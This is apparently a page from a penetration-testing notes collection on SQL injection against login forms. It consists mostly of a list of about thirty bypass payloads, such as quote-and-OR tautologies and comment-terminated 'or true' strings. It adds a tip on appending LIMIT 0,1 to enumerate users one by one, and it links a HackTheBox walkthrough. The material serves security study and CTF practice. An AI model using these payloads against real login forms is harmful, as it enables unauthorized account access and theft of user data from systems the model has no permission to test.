# SQL Injection

## Login Bypasses

For login forms, if they're vulnerable to SQL Injection, the options can range from data exfiltration, to simply bypassing the login forms entirely. Note that the comment type for SQL databases can vary, so it's worth trying both `--` and `#`.  A number of the below are worth trying:

```
' or '1'='1
-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
```

**Source**: [https://xapax.gitbooks.io/security/content/sql-injections.html](https://xapax.gitbooks.io/security/content/sql-injections.html)

If the backend code is only expecting a single result from the query, a number of the above will fail.  If this is the case then using `LIMIT 0,1` at the end of the expression will reduce the result returned to a single element.  You can then vary the first parameter to enumerate different users.



## **Examples**

[HackTheBox - Charon](https://www.youtube.com/watch?v=_csbKuOlmdE)   






